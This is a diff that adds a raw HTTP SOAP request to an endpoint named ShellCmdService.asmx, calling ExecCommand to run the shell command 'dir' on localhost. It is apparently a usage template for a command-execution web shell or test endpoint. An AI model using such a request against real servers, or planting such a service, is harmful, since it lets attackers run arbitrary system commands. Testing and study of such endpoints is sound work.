@@ -1,0 +1,13 @@
+POST /ShellCmdService.asmx HTTP/1.1
+Host: 127.0.0.1
+Content-Type: text/xml
+Content-Length: 347
+
+<?xml version="1.0" encoding="utf-8"?>
+<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+  <soap:Body>
+    <ExecCommand xmlns="http://tempuri.org/">
+      <cmd>dir</cmd>
+    </ExecCommand>
+  </soap:Body>
+</soap:Envelope>
